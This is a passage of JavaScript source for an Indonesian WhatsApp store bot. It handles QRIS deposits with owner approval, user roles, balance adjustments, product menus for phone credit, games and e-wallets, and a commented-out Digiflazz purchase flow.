    // Buat sections untuk pesan
    let sections = [{
        title: "Pascabayar", // Title utama
        rows: uniqueFilteredProducts.map(item => {
            return {
                header: `${item.brand}`, 
                title: `${item.brand} Items`,
                id: `${prefix}cek_pasca ${item.brand}`
            };
        })
    }];
    
    // Buat JSON string untuk buttonParamsJson
    let buttonParamsJson = JSON.stringify({
        title: "Klik Disini",
        sections: sections
    });
    
    // Buat pesan interaktif
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Silahkan Pilih kategori  Di Bawah Ini`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: global.store
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: buttonParamsJson
                        },
                                    {
              "name": "cta_url",
              "buttonParamsJson": `{\"display_text\":\"Contact Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
            }]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: qdoc });
    
    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
 break
 case "cek_pasca":{
  const brand = text.split("|")[0]
  if (!brand) return reply("brand tidak di temukan")
if(cek("id", m.sender) == null) {
  replydaftar(); 
  return;
}      
getListPasca(brand);
  }
  break            
case 'uprole': {
  if (!isOwner) return;

const n = q.split(' ')[0];
const u = q.split(' ')[1];    
if (n === 'USER' || n === 'VIP' || n === 'VVIP' || n === 'AGEN') {
  
  const od = `${u}@s.whatsapp.net`
  sett("role", od, n)
  reply(`role Berhasil di update menjadi ${cek("role", od)}`) 
} else {
  reply('Tipe pengguna tidak valid. Gunakan salah satu dari "USER", "VIP", "VVIP"\n\nContoh Penggunaan\n.uprole AGEN 6281234567889');
}
}
break;
case 'depo': 
case 'isi': 
case 'deposit': {
if(fs.existsSync(PathAuto + m. sender.split('@')[0] + '.json')) return reply(`Selesaikan Deposit Anda Sebelumnya Untuk Membatalkan Silahkan Ketil #ndepo`)
  // Membuat ID acak 8 digit
    const randomId = Math.floor(10000000 + Math.random() * 90000000);

    // Memisahkan pesan menjadi array untuk mendapatkan nominal deposit
    const depoCommand = m.text.split(' ');

    // Memastikan format depo hanya berisi angka tanpa tanda simbol
    const isValidInput = depoCommand.length > 1 && /^\d+$/.test(depoCommand[1]);

    if (!isValidInput) {
        m.reply(`Format Salah atau Nominal Harus Angka\nDeposit Manual\nFormat benar : \`\`\`Depo [Nominal]\`\`\`\n\`\`\`Contoh : Depo 1000\`\`\`\n\nDeposit Otomatis\nFormat benar : \`\`\`Depoqris [Nominal]\`\`\`\n\`\`\`Contoh : Depoqris 1000\`\`\``);
        return;
    }

    // Memeriksa minimal nominal depo (1000)
    const minimalNominal = 1000;
    const nominal = parseInt(depoCommand[1]);

    // Memastikan nominal setelah diubah tetap valid
    if (nominal < minimalNominal) {
        m.reply(`Nominal harus minimal ${minimalNominal}\nFormat benar : \`\`\`Depo [Nominal]\`\`\`\n\`\`\`Contoh : Depo 1000\`\`\``);
        return;
    }

    // Menghitung biaya layanan (0,5% dari jumlah bayar)
    const biayaLayanan = nominal * 0.005;

    // Menghitung saldo diterima (jumlah bayar dikurangi biaya layanan)
    const saldoDiterima = nominal ;

    // Nomor member tanpa @s.whatsapp.net
    const memberNumber = m.sender.split('@')[0];

    // Menambahkan koma pada format nominal tanpa desimal
    const formattedNominal = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0, maximumFractionDigits: 0 }).format(nominal);
    const formattedBiayaLayanan = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0, maximumFractionDigits: 0 }).format(biayaLayanan);
    const formattedSaldoDiterima = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0, maximumFractionDigits: 0 }).format(saldoDiterima);
    const jml = nominal + biayaLayanan
    const jlak = Number(jml) 
    // Menambahkan nominal, biaya layanan, saldo diterima, dan nomor member ke informasi deposit
    let depositInfo = `[ *INFORMASI DEPOSIT* ]\n\n`;
    depositInfo += `*» ID :* ${randomId}\n`;
    depositInfo += `*» Member :* ${memberNumber}\n`;
    depositInfo += `*» Jumlah Bayar :* ${nominal+biayaLayanan}\n`;
    depositInfo += `*» Payment :* QRIS\n`;
    depositInfo += `*» Biaya Layanan :* ${formattedBiayaLayanan}\n`;
    depositInfo += `*» Saldo Diterima :* ${formattedSaldoDiterima}\n\n`;
    depositInfo += `_Silahkan transfer ke pembayaran yang disediakan dan kirimkan bukti dengan ketik #bukti_\n\n`;
    depositInfo += `${toko}`;

    kris.sendMessage(m.chat, { image: qrisdonate, caption: depositInfo }, { quoted: m });
    
let obj = {
     id: memberNumber,
     ref: `${randomId}`, 
     jumlah_bayar: jlak, 
     saldo_diterima: nominal, 
     pay: "QRIS", 
     biaya_layanan: biayaLayanan}
fs.writeFileSync(PathAuto + m.sender.split("@")[0] + ".json", JSON.stringify(obj))
    break;
}        



  case 'ndepo':{
  if(!fs.existsSync(`./Pengaturan/database/deposit/manual/${m.sender.split("@")[0]}.json`)) return reply('Anda Belum Melakukan deposit')       
  let data_depo = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))    
  reply(`Baik kak, Deposit Dengan ID : ${data_depo.reff} dibatalkan 😊`)
fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')    
      }
        break
       
case 'bukti': {
if(!fs.existsSync(`./Pengaturan/database/deposit/manual/${m.sender.split("@")[0]}.json`)) return reply('Anda Belum Melakukan deposit')    
let data_depo = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
    if (!quoted) return reply(`Kirim/Reply gambar dengan caption *${prefix + command}*`);
    if (/image/.test(mime)) {
        let media = await quoted.download();
        m.reply(`Bukti berhasil terkirim ke owner, silahkan menunggu konfirmasi`);
        let buktii = `📥 *DEPOSIT USER* 📥
        
➖➖➖➖➖➖➖➖➖➖
⭔ ID: ${data_depo.ref}
⭔ Nomer: ${data_depo.id}
⭔ Payment: ${data_depo.pay}
⭔ Tanggal: ${tanggal} ${jam}
⭔ Jumlah Bayar: ${formatmoney(data_depo.jumlah_bayar)}
⭔ Biaya Layanan: ${formatmoney(data_depo.biaya_layanan)}
⭔ Saldo Diterima: ${formatmoney(data_depo.saldo_diterima)}
➖➖➖➖➖➖➖➖➖➖

Ada yang melakukan deposit. Mohon untuk dicek saldo pengguna terkait.

Jika sudah masuk, silahkan konfirmasi dengan 
*#acc* ${sender.split('@')[0]}
atau
*#tolak* ${sender.split('@')[0]}`;

        // Kirim bukti deposit ke owner
        kris.sendMessage(global.owner + '@s.whatsapp.net', { image: media, caption: buktii }, { quoted: null });
    } else {
        reply(`Kirim/Reply gambar dengan caption *${prefix + command}*`);
    }
    }
    break;        
case 'acc': {
        if (!isOwner) return
    	
        const target = args[0];
    	if(!fs.existsSync(`./Pengaturan/database/deposit/manual/${target}.json`)) return reply('Nomor Tersebut Tidak Melakukan deposit saldo')
        const kiw = `${target}@s.whatsapp.net`
        if (!target) return m.reply('mana orangnya')
        if(cek("id", kiw) == null) return reply(`Nomor Tersebut Belum Terdaftar di Database Silahkan ketik #daftar`)
        let data_depo = JSON.parse(fs.readFileSync(PathAuto + target + ".json"))
        var loak = Number(data_depo.saldo_diterima) 
        const amountToAdd = loak
         if (isNaN(amountToAdd) || amountToAdd <= 0) {
          return m.reply('Nilai Saldo Harus Berupa Angka!!!');
        }
 
        const targetUser = kiw;
        const sebelum = cek("saldo", kiw) 
        
        sett("+saldo", kiw, loak) ;
    
        
       const akhir = cek("saldo", kiw) 
        const formatSaldo = (amount) => `${amount.toLocaleString()}`;
        m.reply(`───〔 *Deposit Sukses* 〕──\n\n*Nomor :* ${target}\n*Saldo Terkahir :* Rp. ${formatSaldo(sebelum)}\n*Saldo Sekarang :* Rp. ${formatSaldo(akhir)}\n*Waktu :* ${tanggal3}, ${jam} WIB`)
        const capt = `───〔 *Deposit Sukses* 〕──\n\n*Nomor :* ${target}\n*Saldo Terkahir :* Rp. ${formatSaldo(sebelum)}\n*Saldo Sekarang :* Rp. ${formatSaldo(akhir)}\n*Waktu :* ${tanggal3}, ${jam} WIB`
        kris.sendMessage(kiw, {
          text: capt,
          contextInfo: {
            externalAdReply: {
              title: `krisGAMTENG`,
              thumbnailUrl: `${menu}`,
              sourceUrl: `${website}`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, { quoted: m })        
        const trxFilePath = './Pengaturan/database/datadepo.json';
    const trxUserData = JSON.parse(fs.readFileSync(trxFilePath, 'utf8'));
   const waktu = cekWaktu();
    const newTransactionData = {
        buyer: m.sender,
        status: 'Berhasil',
        ref_id: `#${data_depo.ref}`,
        jam: moment.tz('Asia/Jakarta').format('HH:mm:ss'),
        date: waktu, 
        saldo_diterima: data_depo.saldo_diterima,
        total_bayar: data_depo.jumlah_bayar,
    };
    trxUserData.push(newTransactionData);
    fs.writeFileSync(trxFilePath, JSON.stringify(trxUserData, null, 2), 'utf8');    
    fs.unlinkSync(PathAuto + target + ".json")
      }
      break;               
      case 'listtrx': {
    const filePath = './Pengaturan/database/datatrx.json';
    
    try {
        const fileData = fs.readFileSync(filePath, 'utf8');
        const allUserData = JSON.parse(fileData);

        const userData = allUserData.filter(data => data.buyer === m.sender);

        if (userData.length === 0) {
            return reply("Kamu belum memiliki riwayat transaksi. Jika ingin melakukan transaksi silahkan ketik .menu");
        }

        let totalHarga = 0;
        let totalTransactions = userData.length;

        userData.forEach(data => {
            totalHarga += parseFloat(data.harga);
        });

        const historyText = userData.map((data, index) => {
            const formattedHarga = new Intl.NumberFormat('id-ID', {
                style: 'currency',
                currency: 'IDR'
            }).format(data.harga);

            return `_*#Transaksi Ke-${index + 1}:*_
*› Produk:* ${data.produk}
*› Reff ID:* ${data.ref_id}
*› Tujuan:* ${data.tujuan}
*› Harga:* ${formattedHarga}
*› Waktu:* ${data.jam} | ${tanggal}
*› Invoice:* _${data.invoice}_\n`;
        });

        const formattedTotalHarga = new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(totalHarga);

        const replyMessage = `*[ RIWAYAT TRANSAKSI ]*

*Total Transaksi:* ${totalTransactions}
*Total Harga:* ${formattedTotalHarga}

${historyText.join('\n')}`;

        reply(replyMessage);
    } catch (error) {
        console.error('Error reading the transaction history file:', error);
        reply("Ada Masalah ketika membaca data, silahkan hubungi owner.");
    }
    break;
}

case 'setprofit': {
  if (!isOwner) return;
const p = q.split(' ');
const data = JSON.parse(fs.readFileSync("./Pengaturan/database/profit.json"));

if (p[0] === 'user' || p[0] === 'vip' || p[0] === 'vvip' || p[0] === 'agen' ) {
  const newValue = toLvl(p[1]);
  if (isNaN(newValue)) {
    return reply('Harap masukkan angka yang valid.');
  }
  data.profit[p[0]] = newValue;
  data.output[p[0]] = p[1] +'%'
  fs.writeFileSync("./Pengaturan/database/profit.json", JSON.stringify(data, null, 2));
  reply(`Profit untuk tipe pengguna "${p[0]}" berhasil diupdate menjadi ${q}%.`);
} else {
  reply('Tipe pengguna tidak valid. Gunakan salah satu dari "user", "vip", "vvip", " agen", \n\nContoh Penggunaan\n.setprofit vip 10(yaitu keuntungan 10%)');
}
}
break;


case 'batal': {
if(!fs.existsSync(PathTrx + sender.split("@")[0] + ".json")) return reply('Anda Belum Melakukan deposit')   
const data_deposit = JSON.parse(fs.readFileSync(PathTrx + sender.split("@")[0] + ".json"));     
                reply(`Baik kak, Pesanan Dengan ID : ${data_deposit.ID} dibatalkan 😊`);
                fs.unlinkSync(PathTrx + sender.split('@')[0] + '.json');
            }

        break
        case 'restart' : 

  if (m.isGroup) return m.reply('Fitur Khusus Private Chat')


        

      await m.reply(`_Tunggu Sedang Merestart Server_`)

      try{

        await kris.sendMessage(from, {text: "Berhasil Restart"})

        await sleep(3000)

        exec(`npm start`)

      } catch (err) {

        exec(`node index.js`)

        await sleep(4000)

        m.reply('Sukses')

        }

      break		
        case "item":{
  const cat = text.split("|")[0]
  const type = text.split("|")[1]
if(cek("id", m.sender) == null) {
  replydaftar(); 
  return;
}      
let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
    let fs = require('fs');

    // Baca data dari file JSON
    let database = require('./Pengaturan/database/datadigiflaz.json');
    let brandToDisplay = `${cat.toUpperCase()}`;
    let filteredProducts = database.filter(item => 
        item.brand === cat && 
        item.type === type
    );

    // Fungsi format uang
    const formatmoney = (amount) => {
        return new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(amount);
    };

    // Urutkan produk berdasarkan harga dari terendah ke terbesar
    filteredProducts.sort((a, b) => a.price - b.price);

    // Buat sections dari data yang diambil dari database JSON
    let sections = [{
        title: brandToDisplay, // Title utama
        rows: filteredProducts.map(item => {
            const status = item.seller_product_status;
            const seller = status ? '✅ Tersedia' : '⛔ Gangguan';
            const harga = hitungHargaRole(item.price);

            return {
                header: `${seller} (${item.buyer_sku_code})`, // Menggunakan buyer_sku_code sebagai header
                title: item.product_name,
                description: `${formatmoney(harga)}`, // Menambahkan status ke dalam deskripsi
                id: `opap ${item.buyer_sku_code}`
            };
        })
    }];

    // Buat JSON string untuk buttonParamsJson
    let buttonParamsJson = JSON.stringify({
        title: "Klik Disini",
        sections: sections
    });

    // Buat pesan interaktif
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan Klik Button Disini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: toko
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: buttonParamsJson
                        }]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                })
            }
        }
    }, {});

    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
  }
  break     
   case 'gettypw':{
const brand = text.split("|")[0]
const kateg = text.split("|")[1]
getType(brand, kateg) 
}
break        
case 'tambah': {
  const [num_one, num_two] = text.split(' ').map(Number);

  if (!num_one || !num_two) {
    return reply(`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`);
  }

  const result = num_one + num_two;
  reply(`Hasilnya adalah *${result}*`);
break;
}
case 'kurang': {
  const [num_one, num_two] = text.split(' ').map(Number);

  if (!num_one || !num_two) {
    return reply(`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`);
  }

  const result = num_one - num_two;
  reply(`Hasilnya adalah *${result}*`);
break;
}   
case 'kali': {
  const [num_one, num_two] = text.split(' ').map(Number);

  if (!num_one || !num_two) {
    return reply(`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`);
  }

  const result = num_one * num_two;
  reply(`Hasilnya adalah *${result}*`);
break;
}
case 'bagi': {
  const [num_one, num_two] = text.split(' ').map(Number);

  if (!num_one || !num_two) {
    return reply(`Gunakan dengan cara ${prefix}${command} *angka* *angka*\n\nContoh:\n${prefix}${command} 1 2`);
  }

  const result = num_one / num_two;
  reply(`Hasilnya adalah *${result}*`);
break;
}

case 'menu':
if(cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`)   
let msgs = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Silahkan Pilih Menu Di Bawah Ini"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `${toko}`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: `${packname}`,
            subtitle: `${packname}`,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
                              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU",
"sections":[{"title":"LIST MENU",
"rows":[
{"title":"Menu Topup🛒",
"id":"${prefix}store"},
{"title":"Deposit💰",
"id":"${prefix}deposit"},
{"title":"Cek Trx Bulanan📊",
"id":"${prefix}listtrx"}]
}]
}`
              }
           ],
          })
        })
    }
  }
}, {})

kris.relayMessage(from, msgs.message, {
  messageId: msgs.key.id
})
break
case 'ownermenu': {
 if (!isOwner) return m.reply("Fitur khusus owner");
  if(cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`)   
    
         Anu = `> ╭─❏ *『 INFORMASI 』*
> ║ ➪ Name :  ${pushname}
> ║ ➪ Nomor : ${cek("id", m.sender).split("@")[0]}
> ║ ➪ Role : ${cek("role", m.sender)}
> ┗━━━━━━━━━━━━━━━━━━⬣

> ┌──────⭓ *MENU OWNER*
> │⭔ ${prefix}setprofit
> │⭔ ${prefix}getdigi
> │⭔ ${prefix}saldodigi
> │⭔ ${prefix}saldopay
> │⭔ ${prefix}addsaldo
> │⭔ ${prefix}minsaldo
> │⭔ ${prefix}rekapsaldo
> │⭔ ${prefix}rekaptrx
> │⭔ ${prefix}acc
> │⭔ ${prefix}tolak
> │⭔ ${prefix}getip
> └──────────────────⭓
`
reply(Anu);
}
break

case 'store': case 'storemenu':{
  if (cek("id", m.sender) == null) return reply('silahkan daftar terlebih dahulu')
const sections = [{
title: `STORE ${global.toko}`,
highlight_label: '✅',
rows: [{
title: `Isi Pulsa`,
description: `Click here to select`, 
id: `.pulsa`
},
{
title: 'Paket Data',
description: `Click here to select`, 
id: `.kuota`
},
{
title: 'Topup Game',
description: `Click here to select`, 
id: `.topupgame`
},
{
title: 'Voucher Data',
description: `Click here to select`, 
id: `.voucherdata`
},       
{
title: 'Topup E-Wallet',
description: `Click here to select`, 
id: `.ewallet`
},       
{
title: 'Masa Aktif',
description: `Click here to select`, 
id: `.masaaktif`
},       
{
title: 'Token PLN',
description: `Click here to select`, 
id: `.pln`
},       
]
}] 
let listMessage = {
    title: 'List Produk', 
    sections
};
let sns = `Halo Kak 👋 ${pushname} ${ucapanWaktu}

──•~❉ *${global.toko}* ❉~•──
𝐍𝐚𝐦𝐚 : ${pushname}
𝐍𝐨𝐦𝐨𝐫 : ${sender.split("@")[0]}
𝐒𝐚𝐥𝐝𝐨 : ${formatmoney(Number(cek("saldo", m.sender)))}
𝐑𝐨𝐥𝐞 : ${cek("role", m.sender)},`
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: sns
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: global.toko
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: `${toko}`,
 }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: JSON.stringify(listMessage) 

                         
}]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                })
            }
        }
    }, {});
    
    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
} 
break
        


case 'pulsa':{
 if(cek("id", m.sender) == null) return reply('Silahkam Dsftar Terlebih Dahulu')
let op = 'Pulsa';
getKateg(op)    
}
break
case 'topupgame':{
 if(cek("id", m.sender) == null) return reply('Silahkam Dsftar Terlebih Dahulu') 
let op = 'Games';
getKateg(op) 
}
break
case 'kuota':{
 if(cek("id", m.sender) == null) return reply('Silahkam Dsftar Terlebih Dahulu') 
let op = 'Data';
getKateg(op) 
}
break
case 'ewallet':{
 if(cek("id", m.sender) == null) return reply('Silahkam Dsftar Terlebih Dahulu') 
let op = 'E-Money';
getKateg(op) 
}
break      
case 'voucherdata':{
 if(cek("id", m.sender) == null) return reply('Silahkam Dsftar Terlebih Dahulu') 
let op = 'Voucher';
getKateg(op) 
}
break
case 'masaaktif':{
 if(cek("id", m.sender) == null) return reply('Silahkam Dsftar Terlebih Dahulu') 
let op = 'Masa Aktif';
getKateg(op) 
}
break

case 'pln': {
  const kategori = 'PLN'
  const brand = 'PLN'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break 
case 'dana': {
  const kategori = 'E-Money'
  const brand = 'DANA'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break 
case 'gopay': {
  const kategori = 'E-Money'
  const brand = 'GO PAY'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break 
case 'spay': {
  const kategori = 'E-Money'
  const brand = 'SHOPEE PAY'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break 
case 'ovo': {
  const kategori = 'E-Money'
  const brand = 'OVO'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break 
case 'linkaja': {
  const kategori = 'E-Money'
  const brand = 'LinkAja'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break
case 'ff': {
  const kategori = 'Games'
  const brand = 'FREE FIRE'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break       
 case 'pgr': {
  const kategori = 'Games'
  const brand = 'Punishing Gray Raven'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break
case 'aceracer': {
  const kategori = 'Games'
  const brand = 'Ace Racer'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break       
case 'lol': {
  const kategori = 'Games'
  const brand = 'League of Legends Wild Rift'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break       
case 'wdp': {
  const kategori = 'Games'
  const brand = 'MOBILE LEGENDS'
  const type = 'Membership'
getList(kategori, brand, type, )
}
break  
case 'coc': {
  const kategori = 'Games'
  const brand = 'Clash Of Clans'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break  
case 'cod': {
  const kategori = 'Games'
  const brand = 'Call of Duty MOBILE'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break  
case 'valorant': {
  const kategori = 'Games'
  const brand = 'Valorant'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break  
case 'metalslug': {
  const kategori = 'Games'
  const brand = 'Metal Slug Awakening'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break  
case 'lita': {
  const kategori = 'Games'
  const brand = 'Lita'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break  
case 'undawn': {
  const kategori = 'Games'
  const brand = 'Undawn'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break       
case 'pubg': {
  const kategori = 'Games'
  const brand = 'PUBG MOBILE'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break       
case 'ml': {
  const kategori = 'Games'
  const brand = 'MOBILE LEGENDS'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break  
case 'pulsaind': {
  const kategori = 'Pulsa'
  const brand = 'INDOSAT'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break       
case 'pulsatsel': {
  const kategori = 'Pulsa'
  const brand = 'TELKOMSEL'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break         
case 'pulsaxl': {
  const kategori = 'Pulsa'
  const brand = 'XL'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break         
case 'pulsasmr': {
  const kategori = 'Pulsa'
  const brand = 'SMARTFREN'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break         
case 'pulsaaxis': {
  const kategori = 'Pulsa'
  const brand = 'AXIS'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break         
case 'pulsabyu': {
  const kategori = 'Pulsa'
  const brand = 'B.yu'
  const type = 'Umum'
getList(kategori, brand, type, )
}
break                     
case 'isattf': {
  const kategori = 'Pulsa'
  const brand = 'INDOSAT'
  const type = 'Pulsa Transfer'
getList(kategori, brand, type, )
}
break                       
case 'tseltf': {
  const kategori = 'Pulsa'
  const brand = 'TELKOMSEL'
  const type = 'Pulsa Transfer'
getList(kategori, brand, type, )
}
break                       
case 'xltf': {
  const kategori = 'Pulsa'
  const brand = 'XL'
  const type = 'Pulsa Transfer'
getList(kategori, brand, type, )
}
break                       
case 'axistf': {
  const kategori = 'Pulsa'
  const brand = 'AXIS'
  const type = 'Pulsa Transfer'
getList(kategori, brand, type, )
}
break                       
case 'smrtf': {
  const kategori = 'Pulsa'
  const brand = 'SMARTFREN'
  const type = 'Pulsa Transfer'
getList(kategori, brand, type, )
}
break  
 case 'paketind': {
  const kategori = 'Data'
  const brand = 'INDOSAT'
  const type = 'Umum'
getPaket(kategori, brand, type, )
}
break       
case 'pakettsel': {
  const kategori = 'Data'
  const brand = 'TELKOMSEL'
  const type = 'Umum'
getPaket(kategori, brand, type, )
}
break         
case 'paketxl': {
  const kategori = 'Data'
  const brand = 'XL'
  const type = 'Umum'
getPaket(kategori, brand, type, )
}
break         
case 'paketsmr': {
  const kategori = 'Data'
  const brand = 'SMARTFREN'
  const type = 'Umum'
getPaket(kategori, brand, type, )
}
break         
case 'paketaxis': {
  const kategori = 'Data'
  const brand = 'AXIS'
  const type = 'Umum'
getPaket(kategori, brand, type, )
}
break         
case 'paketbyu': {
  const kategori = 'Data'
  const brand = 'B.yu'
  const type = 'Umum'
getPaket(kategori, brand, type, )
}
break         
 
case 'daftar':{
if(cek("id", m.sender) == m.sender) return reply(`Anda Sudah Terdaftar Di Database`)
daftarr() 
 }
 break  
 
case 'addsaldo':{
if (!isOwner) return reply(mess.owner) 
var sd = text.split("|")[0]
var noa = text.split("|")[1]
if (!sd || !noa) return reply(`Contoh Penambahan saldo adalah\n#addsaldo 10000|62882007324217`) 
var add = Number(sd);
var koa = noa + "@s.whatsapp.net"
sett("+saldo", koa, add) 
reply(`Saldo Dengan Nominal ${formatmoney(sd)} Berhasil Di tambah\nSaldo Sekarang ${cek("saldo", koa)}`) 
var nn = `Halo Kak Penambahan saldo dengan jumlah ${formatmoney(sd)} Berhasil di tambahkan di akun anda`
kris.sendMessage(koa, {text:nn})
  }
  break
case 'minsaldo':{
if (!isOwner) return reply(mess.owner) 
var sd = text.split("|")[0]
var noa = text.split("|")[1]
if (!sd || !noa) return reply(`Contoh Penambahan saldo adalah\n#addsaldo 10000|62882007324217`) 
var add = Number(sd);
var koa = noa + "@s.whatsapp.net"
sett("-saldo", koa, add) 
reply(`Saldo Dengan Nominal ${formatmoney(sd)} Berhasil Di Kurangi Saldo Sekarang ${cek("saldo", koa)}`) 
var nn = `Halo Kak Pengurangan saldo dengan jumlah ${formatmoney(sd)} Berhasil di Di Kurangi di akun anda`
kris.sendMessage(koa, {text:nn})
  }
  break 
/*
        case 'yes': {    
 if(cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`)   
if(cek("status", m.sender) == true) return reply(`Tidak ada pesanan sebelumnya silahkan melakukan pembelian produk kembali.`)  
let kode_buyer = `${cek("kode_layanan", m.sender)}`
let ll = cek("saldo", m.sender) 
let tujuan = `${cek("tujuan", m.sender)}` 
let harga = `${cek("harga", m.sender)}` 
let tgl_trx= `${tanggal + jam}` 
sett("-saldo", m.sender, harga)
let referdf = `${cek("reff", m.sender)}` 
let ref_no = `${sender.split('@')[0]}`
let namaproduk = `${cek("layanan", m.sender)}`
let nomor = `${tujuan}`
let harga_produk = `${harga}`
let kode_produk= `${kode_buyer}`

var hrga = Number(harga_produk)
const signature = crypto.createHash('md5')
.update(digiuser + digiapi + referdf)
.digest('hex');
var config = {
method: 'POST',
url: 'https://api.digiflazz.com/v1/transaction',
data: {
"username": digiuser,
"buyer_sku_code": kode_buyer,
"customer_no": tujuan,
"ref_id": referdf,
"sign": signature
}
};
axios(config)
.then(async res => {
m.reply(`*「 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 」*`)

    let status = res.data.data.status;  
    console.log(status)        
while (status !== 'Sukses') {
await sleep(1000); 
const response = await axios(config);
status = response.data.data.status; 
              if (status == "Gagal") {
                            
             sett("+saldo", m.sender, hrga)               
              reply(`           _${toko}_\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( ${response.data.data.status} )\n══════════════════════\n_Tujuan :_ ${nomor}\n_Layanan :_ ${namaproduk}\n_Harga :_ ${formatmoney(harga_produk)}\n_Mess :_ ${response.data.data.message}`) 
kris.sendMessage(nomorKu, {text:`*Transaksi Gagal Produk:* ${namaproduk}\n${response.data.data.message}`}) 
              break;
              }       
    if (status == "Sukses") {
const trxFilePath = './Pengaturan/database/datatrx.json';
    const trxUserData = JSON.parse(fs.readFileSync(trxFilePath, 'utf8'));
   const waktu = cekWaktu();
    const newTransactionData = {
        buyer: m.sender,
        status: response.data.data.message,
        ref_id: response.data.data.ref_id,
        jam: moment.tz('Asia/Jakarta').format('HH:mm:ss'),
        date: waktu, 
        produk: namaproduk,
        harga_modal: response.data.data.price,
        harga: harga_produk,
        tujuan: tujuan,
        invoice: response.data.data.sn
    };
    trxUserData.push(newTransactionData);
